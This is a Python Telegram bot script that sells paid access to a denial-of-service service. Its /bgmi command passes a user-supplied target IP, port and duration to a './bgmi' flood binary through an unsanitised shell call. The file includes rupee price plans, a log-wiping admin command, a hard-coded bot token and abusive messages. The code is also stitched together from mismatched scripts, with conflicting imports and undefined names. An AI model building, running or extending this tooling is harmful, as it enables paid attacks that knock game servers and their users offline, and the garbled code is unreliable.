import telebot
import subprocess
import datetime
import os
import random
import string
import json
import time
import logging
from aiogram import Bot
import asyncio


from keep_alive import keep_alive
keep_alive()

import string
import random
import logging
from datetime import datetime, timedelta
from Crypto.Hash import SHA256
from telegram import Update, ForceReply
from telegram.ext import Updater, CommandHandler, CallbackContext, Filters
from apscheduler.schedulers.background import BackgroundScheduler
import json
import os

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

logger = logging.getLogger(__name__)

# Load or initialize approved users from user.json
user_file = 'user.json'
if os.path.exists(user_file):
    with open(user_file, 'r') as f:
        approved_users = json.load(f)
else:
    approved_users = {}

# Dictionary to store generated keys and their statuses
generated_keys = {}

# Function to save approved users to user.json
def save_users():
    with open(user_file, 'w') as f:
        json.dump(approved_users, f, default=str)

# Function to save generated keys to keys.json
def save_keys():
    with open('keys.json', 'w') as f:
        json.dump(generated_keys, f, default=str)

# Function to load generated keys from keys.json
if os.path.exists('keys.json'):
    with open('keys.json', 'r') as f:
        generated_keys = json.load(f)
else:
    generated_keys = {}

# Function to generate a random key
def generate_key() -> str:
    length = 32  # Length of the key
    chars = string.ascii_letters + string.digits
    random_key = ''.join(random.choice(chars) for _ in range(length))
    return random_key

# Function to hash the key
def hash_key(key: str) -> str:
    hash_object = SHA256.new(data=key.encode())
    return hash_object.hexdigest()

# Command handler to generate and send a unique key with a validity duration
def gen_key(update: Update, context: CallbackContext) -> None:
    user_id = update.effective_user.id

    if str(user_id) not in approved_users:
        update.message.reply_text('You are not approved to generate a key.')
        return

    user_info = approved_users[str(user_id)]

    if datetime.now() > datetime.fromisoformat(user_info['expiration']):
        update.message.reply_text('Your approval has expired. Please contact an admin.')
        return

    if user_info['balance'] <= 0:
        update.message.reply_text('You have no balance left to generate keys.')
        return

    if len(context.args) < 1:
        update.message.reply_text('Please specify the validity duration (in days) for the key.')
        return

    try:
        duration_days = int(context.args[0])
    except ValueError:
        update.message.reply_text('Invalid duration. Please specify the validity duration (in days) for the key.')
        return

    random_key = generate_key()
    hashed_key = hash_key(random_key)

    # Store the generated key with the validity duration
    generated_keys[hashed_key] = {
        'user_id': user_id,
        'redeemed': False,
        'duration_days': duration_days,
        'redemption_time': None
    }
    save_keys()

    # Deduct one from the user's balance
    user_info['balance'] -= 1
    save_users()

    # Log the key generation
    logger.info(f"User {user_id} generated key: {random_key} (Hash: {hashed_key})")

    update.message.reply_text(f"Your unique key: {random_key}\nHash: {hashed_key}\nValidity: {duration_days} days\nRemaining balance: {user_info['balance']}")

# Command handler to approve a user with an optional expiration time and initial balance
def approve_user(update: Update, context: CallbackContext) -> None:
    if len(context.args) < 2:
        update.message.reply_text('Please specify the user ID, initial balance, and optionally the number of days until expiration.')
        return

    try:
        approve_id = context.args[0]
        balance = int(context.args[1])

        if len(context.args) > 2:
            days = int(context.args[2])
            expiration_time = datetime.now() + timedelta(days=days)
        else:
            expiration_time = datetime.max

        approved_users[approve_id] = {
            'balance': balance,
            'expiration': expiration_time.isoformat()
        }
        save_users()

        update.message.reply_text(f'User {approve_id} has been approved with a balance of {balance} and expiration time of {expiration_time}.')
    except ValueError:
        update.message.reply_text('Invalid user ID, balance, or number of days.')

# Command handler to redeem a key
def redeem_key(update: Update, context: CallbackContext) -> None:
    if not context.args:
        update.message.reply_text('Please provide the key to redeem.')
        return

    key_to_redeem = context.args[0]
    hashed_key = hash_key(key_to_redeem)

    if hashed_key in generated_keys and not generated_keys[hashed_key]['redeemed']:
        generated_keys[hashed_key]['redeemed'] = True
        user_id = generated_keys[hashed_key]['user_id']
        redemption_time = datetime.now()
        generated_keys[hashed_key]['redemption_time'] = redemption_time.isoformat()
        save_keys()

        # Log the key redemption
        logger.info(f"User {user_id} redeemed key: {key_to_redeem} (Hash: {hashed_key})")

        update.message.reply_text(f"The key has been successfully redeemed. It will expire in {generated_keys[hashed_key]['duration_days']} days from now.")
    else:
        update.message.reply_text('Invalid or already redeemed key.')

# Command handler to remove a user
def remove_user(update: Update, context: CallbackContext) -> None:
    if not context.args:
        update.message.reply_text('Please provide the user ID to remove.')
        return

    user_id = context.args[0]
    if user_id in approved_users:
        del approved_users[user_id]
        save_users()
        update.message.reply_text(f'User {user_id} has been removed.')
    else:
        update.message.reply_text('User ID not found.')

# Function to check for expiring and expired keys
def check_expiring_keys(context: CallbackContext) -> None:
    current_time = datetime.now()
    to_notify = []
    to_remove = []

    for key, data in generated_keys.items():
        if data['redeemed']:
            redemption_time = datetime.fromisoformat(data['redemption_time'])
            expiration_time = redemption_time + timedelta(days=data['duration_days'])

            # Notify users 60 minutes before expiration
            if expiration_time - timedelta(minutes=60) <= current_time < expiration_time:
                to_notify.append((data['user_id'], expiration_time))
            
            # Remove expired keys
            if current_time >= expiration_time:
                to_remove.append((data['user_id'], key))

    for user_id, expiration_time in to_notify:
        context.bot.send_message(chat_id=user_id, text=f"🚨YOUR KEY IS ENDING IN 60 MINUTES🚨")

    for user_id, key in to_remove:
        del generated_keys[key]
        if user_id in approved_users:
            del approved_users[str(user_id)]
        save_keys()
        save_users()
        context.bot.send_message(chat_id=user_id, text="Your key has expired and you have been removed from the approved users list.")

# Start command handler
def start(update: Update, context: CallbackContext) -> None:
    user = update.effective_user
    update.message.reply_html(
        rf'Hi {user.mention_html()}! Use /genkey <days> to generate a unique key with a specified validity duration if you are approved. Admins can use /approve <user_id> <balance> <days> to approve users with an optional expiration time and initial balance. Use /redeem <key> to redeem a key. Admins can use /remove <user_id> to remove a user.',
        reply_markup=ForceReply(selective=True),
    )

def main() -> None:
    """Start the bot."""
    # Replace 'YOUR TOKEN HERE' with your actual bot token
    updater = Updater("7353106103:AAEmWPOELbGBOlzJiKX-LUkS-WcHcqTYphc")

    # Get the dispatcher to register handlers
    dispatcher = updater.dispatcher

    # on different commands - answer in Telegram
    dispatcher.add_handler(CommandHandler("start", start))
    dispatcher.add_handler(CommandHandler("genkey", gen_key))
    dispatcher.add_handler(CommandHandler("approve", approve_user, Filters.user(user_id="1132426169")))  # Replace ADMIN_USER_ID with the admin's user ID
    dispatcher.add_handler(CommandHandler("redeem", redeem_key))
    dispatcher.add_handler(CommandHandler("remove", remove_user, Filters.user(user_id="1132426169")))  # Replace ADMIN_USER_ID with the admin's user ID

    # Start the Bot
    updater.start_polling()

    # Schedule job to check for expiring and expired keys
    scheduler = BackgroundScheduler()
    scheduler.add_job(lambda: check_expiring_keys(dispatcher.bot), 'interval', minutes=1)
    scheduler.start()


# Insert your Telegram bot token here
bot = telebot.TeleBot('7353106103:AAEmWPOELbGBOlzJiKX-LUkS-WcHcqTYphc')
# Admin user IDs
admin_id = {"1132426169"}

# Files for data storage
USER_FILE = "users.json"
LOG_FILE = "log.txt"
KEY_FILE = "keys.json"

# Cooldown settings
COOLDOWN_TIME = 0  # in seconds
CONSECUTIVE_ATTACKS_LIMIT = 5
CONSECUTIVE_ATTACKS_COOLDOWN = 10  # in seconds

# Restart settings
MAX_RESTARTS = 5
RESTART_PERIOD = 60  # Seconds

# In-memory storage
users = {}
keys = {}
bgmi_cooldown = {}
consecutive_attacks = {}

# Read users and keys from files initially

def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else f"UserID: {user_id}"

    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                return "𝐋𝐨𝐠𝐬 𝐰𝐞𝐫𝐞 𝐀𝐥𝐫𝐞𝐚𝐝𝐲 𝐅𝐮𝐜𝐤𝐞𝐝"
            else:
                file.truncate(0)
                return "𝐅𝐮𝐜𝐤𝐞𝐝 𝐓𝐡𝐞 𝐋𝐨𝐠𝐬 𝐒𝐮𝐜𝐜𝐞𝐬𝐟𝐮𝐥𝐥𝐲✅"
    except FileNotFoundError:
        return "𝐋𝐨𝐠𝐬 𝐖𝐞𝐫𝐞 𝐀𝐥𝐫𝐞𝐚𝐝𝐲 𝐅𝐮𝐜𝐤𝐞𝐝."

def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"

    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")


def add_time_to_current_date(hours=0, days=0):
    return (datetime.datetime.now() + datetime.timedelta(hours=hours, days=days)).strftime('%Y-%m-%d %H:%M:%S')


@bot.message_handler(commands=['myinfo'])
def get_user_info(message):
    user_id = str(message.chat.id)
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else "N/A"
    user_role = "Admin" if user_id in admin_id else "User"
    remaining_time = get_remaining_approval_time(user_id)
    response = f"👤 Your Info:\n\n🆔 User ID: <code>{user_id}</code>\n📝 Username: {username}\n🔖 Role: {user_role}\n📅 Approval Expiry Date: {user_approval_expiry.get(user_id, 'Not Approved')}\n⏳ Remaining Approval Time: {remaining_time}"
    bot.reply_to(message, response, parse_mode="HTML")


@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    
    if user_id in users:
        expiration_date = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
        if datetime.datetime.now() > expiration_date:
            response = "❌ 𝐀𝐜𝐜𝐞𝐬𝐬 𝐆𝐨𝐓 𝐅𝐮𝐂𝐤𝐞𝐝 𝐆𝐞𝐍 𝐧𝐄𝐰 𝐊𝐞𝐘 𝐀𝐧𝐝 𝐫𝐞𝐝𝐞𝐞𝐌-> using /redeemk <key> ❌"
            bot.reply_to(message, response)
            return
        
        if user_id not in admin_id:
            if user_id in bgmi_cooldown:
                time_since_last_attack = (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds
                if time_since_last_attack < COOLDOWN_TIME:
                    cooldown_remaining = COOLDOWN_TIME - time_since_last_attack
                    response = f"𝐖𝐚𝐢𝐭 𝐊𝐫𝐥𝐞 𝐋𝐚𝐰𝐝𝐞 {cooldown_remaining} 𝐒𝐞𝐜𝐨𝐧𝐝 𝐛𝐚𝐚𝐝  /bgmi 𝐔𝐬𝐞 𝐤𝐫𝐧𝐚."
                    bot.reply_to(message, response)
                    return
                
                if consecutive_attacks.get(user_id, 0) >= CONSECUTIVE_ATTACKS_LIMIT:
                    if time_since_last_attack < CONSECUTIVE_ATTACKS_COOLDOWN:
                        cooldown_remaining = CONSECUTIVE_ATTACKS_COOLDOWN - time_since_last_attack
                        response = f"𝐖𝐚𝐢𝐭 𝐊𝐫𝐥𝐞 𝐋𝐮𝐧𝐃 𝐤𝐞 {cooldown_remaining} 𝐒𝐞𝐜𝐨𝐧𝐝 𝐛𝐚𝐚𝐝 𝐆𝐚𝐧𝐝 𝐦𝐚𝐫𝐰𝐚 𝐥𝐞𝐧𝐚 𝐝𝐨𝐨𝐛𝐚𝐫𝐚."
                        bot.reply_to(message, response)
                        return
                    else:
                        consecutive_attacks[user_id] = 0

            bgmi_cooldown[user_id] = datetime.datetime.now()
            consecutive_attacks[user_id] = consecutive_attacks.get(user_id, 0) + 1

        command = message.text.split()
        if len(command) == 4:
            target = command[1]
            try:
                port = int(command[2])
                time = int(command[3])
                if time > 300:
                    response = "⚠️𝐄𝐑𝐑𝐎𝐑:280 𝐒𝐄 𝐓𝐇𝐎𝐃𝐀 𝐊𝐀𝐌 𝐓𝐈𝐌𝐄 𝐃𝐀𝐀𝐋 𝐆𝐀𝐍𝐃𝐔."
                else: 
                    record_command_logs(user_id, '/bgmi', target, port, time)
                    log_command(user_id, target, port, time)
                    start_attack_reply(message, target, port, time)
                    full_command = f"./bgmi {target} {port} {time} 500"
                    subprocess.run(full_command, shell=True)
                    response = f"𝐂𝐇𝐔𝐃𝐀𝐈 𝐒𝐓𝐀𝐑𝐓𝐄𝐃🎮\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬"
            except ValueError:
                response = "𝐄𝐑𝐑𝐎𝐑»𝐈𝐏 𝐏𝐎𝐑𝐓 𝐓𝐇𝐈𝐊 𝐒𝐄 𝐃𝐀𝐀𝐋 𝐂𝐇𝐔𝐓𝐘𝐄"
        else:
            response = "✅Usage: /bgmi <target> <port> <time>"
    else:
        response = "𝐁𝐒𝐃𝐊 𝐆𝐀𝐑𝐄𝐄𝐁 𝐀𝐂𝐂𝐄𝐒𝐒 𝐍𝐀𝐇𝐈 𝐇 𝐓𝐄𝐑𝐏𝐄"

    bot.reply_to(message, response)

def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    response = f"{username}, 🔥𝐂𝐇𝐔𝐃𝐀𝐈 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥\n\n🎯𝐓𝐀𝐑𝐆𝐄𝐓: {target}\n🚪𝐏𝐎𝐑𝐓: {port}\n⏳𝐓𝐢𝐌𝐄: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐄𝐓𝐇𝐎𝐃: 𝐆𝐔𝐋𝐀𝐁𝐈𝐄 𝐏𝐔𝐒𝐒𝐘🥵"
    bot.reply_to(message, response)

@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        response = clear_logs()
    else:
        response = "𝐀𝐁𝐄 𝐆𝐀𝐍𝐃𝐔 𝐉𝐈𝐒𝐊𝐀 𝐁𝐎𝐓 𝐇 𝐖𝐀𝐇𝐈 𝐔𝐒𝐄 𝐊𝐑 𝐒𝐊𝐓𝐀 𝐄𝐒𝐄 𝐁𝐀𝐒."
    bot.reply_to(message, response)

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if users:
            response = "𝐂𝐇𝐔𝐓𝐘𝐀 𝐔𝐒𝐑𝐄𝐑 𝐋𝐈𝐒𝐓:\n"
            for user_id, expiration_date in users.items():
                try:
                    user_info = bot.get_chat(int(user_id))
                    username = user_info.username if user_info.username else f"UserID: {user_id}"
                    response += f"- @{username} (ID: {user_id}) expires on {expiration_date}\n"
                except Exception:
                    response += f"- 𝐔𝐬𝐞𝐫 𝐢𝐝: {user_id} 𝐄𝐱𝐩𝐢𝐫𝐞𝐬 𝐨𝐧 {expiration_date}\n"
        else:
            response = "𝐀𝐣𝐢 𝐋𝐚𝐧𝐝 𝐌𝐞𝐫𝐚"
    else:
        response = "𝐁𝐇𝐀𝐆𝐉𝐀 𝐁𝐒𝐃𝐊 𝐎𝐍𝐋𝐘 𝐎𝐖𝐍𝐄𝐑 𝐂𝐀𝐍 𝐃𝐎 𝐓𝐇𝐀𝐓"
    bot.reply_to(message, response)

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "𝐀𝐣𝐢 𝐥𝐚𝐧𝐝 𝐦𝐞𝐫𝐚 𝐍𝐎 𝐃𝐀𝐓𝐀 𝐅𝐎𝐔𝐍𝐃."
                bot.reply_to(message, response)
        else:
            response = "𝐀𝐣𝐢 𝐥𝐚𝐧𝐝 𝐦𝐞𝐫𝐚 𝐌𝐄𝐑𝐀 𝐍𝐎 𝐃𝐀𝐓𝐀 𝐅𝐎𝐔𝐍𝐃"
            bot.reply_to(message, response)
    else:
        response = "𝐁𝐇𝐀𝐆𝐉𝐀 𝐁𝐒𝐃𝐊 𝐎𝐍𝐋𝐘 𝐎𝐖𝐍𝐄𝐑 𝐂𝐀𝐍 𝐑𝐔𝐍 𝐓𝐇𝐀𝐓 𝐂𝐎𝐌𝐌𝐀𝐍𝐃"
        bot.reply_to(message, response)

@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"𝐋𝐄 𝐑𝐄 𝐋𝐔𝐍𝐃 𝐊𝐄 𝐓𝐄𝐑𝐈 𝐈𝐃: {user_id}"
    bot.reply_to(message, response)

@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in users:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "𝐋𝐞 𝐫𝐞 𝐋𝐮𝐧𝐝 𝐤𝐞 𝐘𝐞 𝐭𝐞𝐫𝐢 𝐟𝐢𝐥𝐞:\n" + "".join(user_logs)
                else:
                    response = "𝐔𝐒𝐄 𝐊𝐑𝐋𝐄 𝐏𝐄𝐇𝐋𝐄 𝐅𝐈𝐑 𝐍𝐈𝐊𝐀𝐋𝐔𝐍𝐆𝐀 𝐓𝐄𝐑𝐈 𝐅𝐈𝐋𝐄."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "𝐘𝐄 𝐆𝐀𝐑𝐄𝐄𝐁 𝐄𝐒𝐊𝐈 𝐌𝐀𝐊𝐈 𝐂𝐇𝐔𝐓 𝐀𝐂𝐂𝐄𝐒𝐒 𝐇𝐈 𝐍𝐀𝐇𝐈 𝐇 𝐄𝐒𝐊𝐄 𝐏𝐀𝐒"

    bot.reply_to(message, response)

@bot.message_handler(commands=['help'])
def show_help(message):
    help_text = '''𝐌𝐄𝐑𝐀 𝐋𝐀𝐍𝐃 𝐊𝐀𝐑𝐄 𝐇𝐄𝐋𝐏 𝐓𝐄𝐑𝐈 𝐋𝐄 𝐅𝐈𝐑 𝐁𝐇𝐈 𝐁𝐀𝐓𝐀 𝐃𝐄𝐓𝐀:
💥 /bgmi 𝐁𝐆𝐌𝐈 𝐊𝐄 𝐒𝐄𝐑𝐕𝐄𝐑 𝐊𝐈 𝐂𝐇𝐔𝐃𝐀𝐘𝐈.
💥 /rules: 𝐅𝐨𝐥𝐥𝐨𝐰 𝐞𝐥𝐬𝐞 𝐑𝐚𝐩𝐞.
💥 /mylogs: 𝐀𝐏𝐊𝐄 𝐏𝐎𝐎𝐑𝐀𝐍𝐄 𝐊𝐀𝐀𝐑𝐍𝐀𝐌𝐄 𝐉𝐀𝐍𝐍𝐄 𝐊 𝐋𝐈𝐘𝐄.
💥 /plan: 𝐉𝐢𝐧𝐝𝐠𝐢 𝐦𝐞 𝐊𝐨𝐞 𝐏𝐋𝐀𝐍 𝐧𝐚𝐡𝐢 𝐡𝐨𝐧𝐚 𝐂𝐡𝐚𝐡𝐢𝐲𝐞.
💥 /redeem <key>: 𝐊𝐞𝐲 𝐑𝐞𝐝𝐞𝐞𝐦 𝐰𝐚𝐥𝐚 𝐂𝐨𝐦𝐦𝐚𝐧𝐝.

🤖 Admin commands:
💥 /genkey <amount> <hours/days>: 𝐓𝐎 𝐌𝐀𝐊𝐄 𝐊𝐄𝐘.
💥 /allusers: 𝐋𝐢𝐒𝐓 𝐎𝐅 𝐂𝐇𝐔𝐓𝐘𝐀 𝐔𝐒𝐄𝐑𝐒.
💥 /logs: 𝐀𝐀𝐏𝐊𝐄 𝐊𝐀𝐑𝐓𝐎𝐎𝐓𝐄 𝐉𝐀𝐍𝐍𝐄 𝐖𝐀𝐋𝐀 𝐂𝐎𝐌𝐌𝐀𝐍𝐃.
💥 /clearlogs: 𝐅𝐔𝐂𝐊 𝐓𝐇𝐄 𝐋𝐎𝐆 𝐅𝐈𝐋𝐄.
💥 /broadcast <message>: 𝐁𝐑𝐎𝐀𝐃𝐂𝐀𝐒𝐓 𝐊𝐀 𝐌𝐀𝐓𝐋𝐀𝐁 𝐓𝐎 𝐏𝐀𝐓𝐀 𝐇𝐎𝐆𝐀 𝐀𝐍𝐏𝐀𝐃.
'''
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''𝐐 𝐫𝐞 𝐂𝐇𝐀𝐏𝐑𝐈, {user_name}! 𝐓𝐡𝐢𝐬 𝐢𝐒 𝐘𝐎𝐔𝐑 𝐅𝐀𝐓𝐇𝐑𝐞𝐫𝐒 𝐁𝐨𝐓 𝐒𝐞𝐫𝐯𝐢𝐜𝐞.
🤖𝐀𝐍𝐏𝐀𝐃 𝐔𝐒𝐄 𝐇𝐄𝐋𝐏 𝐂𝐎𝐌𝐌𝐀𝐍𝐃: /help
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, 𝐅𝐎𝐋𝐋𝐎𝐖 𝐓𝐇𝐈𝐒 𝐑𝐔𝐋𝐄𝐒 𝐄𝐋𝐒𝐄 𝐘𝐎𝐔𝐑 𝐌𝐎𝐓𝐇𝐄𝐑 𝐈𝐒 𝐌𝐈𝐍𝐄:

1. Don't run too many attacks to avoid a ban from the bot.
2. Don't run 2 attacks at the same time to avoid a ban from the bot.
3. We check the logs daily, so follow these rules to avoid a ban!
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, 𝐏𝐋𝐀𝐍 𝐃𝐄𝐊𝐇𝐄𝐆𝐀 𝐓𝐔 𝐆𝐀𝐑𝐄𝐄𝐁😂:

VIP 🌟:
-> Attack time: 180 seconds
-> After attack limit: 5 minutes
-> Concurrent attacks: 3

𝐓𝐄𝐑𝐈 𝐀𝐔𝐊𝐀𝐃 𝐒𝐄 𝐁𝐀𝐇𝐀𝐑 💸:
1𝐃𝐚𝐲: 200 𝐫𝐬
3𝐃𝐚𝐲: 450 𝐫𝐬
1𝐖𝐞𝐞𝐤: 800 𝐫𝐬
2𝐖𝐞𝐞𝐤: 1200 𝐫𝐬
𝐌𝐨𝐧𝐓𝐡: 1700 𝐫𝐬 
@GODxBGMI_OWNER 💥
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def admin_commands(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, 𝐋𝐞 𝐫𝐞 𝐥𝐮𝐧𝐝 𝐊𝐞 𝐘𝐞 𝐑𝐡𝐞 𝐓𝐞𝐫𝐞 𝐜𝐨𝐦𝐦𝐚𝐧𝐝:

💥 /genkey 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞 𝐚 𝐤𝐞𝐲.
💥 /allusers: 𝐋𝐢𝐬𝐭 𝐨𝐟 𝐜𝐡𝐮𝐭𝐲𝐚 𝐮𝐬𝐞𝐫𝐬.
💥 /logs: 𝐒𝐡𝐨𝐰 𝐥𝐨𝐠𝐬 𝐟𝐢𝐥𝐞.
💥 /clearlogs: 𝐅𝐮𝐜𝐤 𝐓𝐡𝐞 𝐥𝐨𝐆 𝐟𝐢𝐥𝐞.
💥 /broadcast <message>: 𝐁𝐫𝐨𝐚𝐝𝐜𝐚𝐬𝐭.
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) == 2:
            target_user_id = command[1]
            if target_user_id in users:
                del users[target_user_id]
                save_users()
                response = f"𝐔𝐬𝐞𝐫 {target_user_id} 𝐒𝐮𝐜𝐜𝐞𝐬𝐟𝐮𝐥𝐥𝐲 𝐅𝐮𝐂𝐤𝐞𝐃."
            else:
                response = "𝐋𝐎𝐋 𝐮𝐬𝐞𝐫 𝐧𝐨𝐭 𝐟𝐨𝐮𝐧𝐝😂"
        else:
            response = "Usage: /remove <user_id>"
    else:
        response = "𝐎𝐍𝐋𝐘 𝐁𝐎𝐓 𝐊𝐄 𝐏𝐄𝐄𝐓𝐀𝐉𝐈 𝐂𝐀𝐍 𝐃𝐎 𝐓𝐇𝐈𝐒"

    bot.reply_to(message, response)

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "𝐌𝐄𝐒𝐒𝐀𝐆𝐄 𝐅𝐑𝐎𝐌 𝐘𝐎𝐔𝐑 𝐅𝐀𝐓𝐇𝐄𝐑:\n\n" + command[1]
            for user_id in users:
                try:
                    bot.send_message(user_id, message_to_broadcast)
                except Exception as e:
                    print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast message sent successfully to all users 👍."
        else:
            response = "𝐁𝐑𝐎𝐀𝐃𝐂𝐀𝐒𝐓 𝐊𝐄 𝐋𝐈𝐘𝐄 𝐌𝐄𝐒𝐒𝐀𝐆𝐄 𝐓𝐎 𝐋𝐈𝐊𝐇𝐃𝐄 𝐆𝐀𝐍𝐃𝐔"
    else:
        response = "𝐎𝐍𝐋𝐘 𝐁𝐎𝐓 𝐊𝐄 𝐏𝐄𝐄𝐓𝐀𝐉𝐈 𝐂𝐀𝐍 𝐑𝐔𝐍 𝐓𝐇𝐈𝐒 𝐂𝐎𝐌𝐌𝐀𝐍𝐃"

    bot.reply_to(message, response)

if __name__ == "__main__":
    load_data()
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            print(e)
            # Add a small delay to avoid rapid looping in case of persistent errors
            time.sleep(15)

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
bot = Bot(API_TOKEN)

def start_bot():
    """Start the bot script as a subprocess."""
    return subprocess.Popen(['python', 'm.py'])

async def notify_admin(message):
    """Send a notification message to the admin via Telegram."""
    try:
        await bot.send_message(ADMIN_ID, message)
        logging.info("Admin notified: %s", message)
    except Exception as e:
        logging.error("Failed to send message to admin: %s", e)

async def main():
    """Main function to manage bot process lifecycle."""
    restart_count = 0
    last_restart_time = time.time()
    
    while True:
        if restart_count >= MAX_RESTARTS:
            current_time = time.time()
            if current_time - last_restart_time < RESTART_PERIOD:
                wait_time = RESTART_PERIOD - (current_time - last_restart_time)
                logging.warning("Maximum restart limit reached. Waiting for %.2f seconds...", wait_time)
                await notify_admin(f"⚠️ Maximum restart limit reached. Waiting for {int(wait_time)} seconds before retrying.")
                await asyncio.sleep(wait_time)
            restart_count = 0
            last_restart_time = time.time()

        logging.info("Starting the bot...")
        process = start_bot()
        await notify_admin("🚀 Bot is starting...")

        while process.poll() is None:
            await asyncio.sleep(5)
        
        logging.warning("Bot process terminated. Restarting in 10 seconds...")
        await notify_admin("⚠️ The bot has crashed and will be restarted in 10 seconds.")
        restart_count += 1
        await asyncio.sleep(10)
        

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logging.info("Venom script terminated by user.")
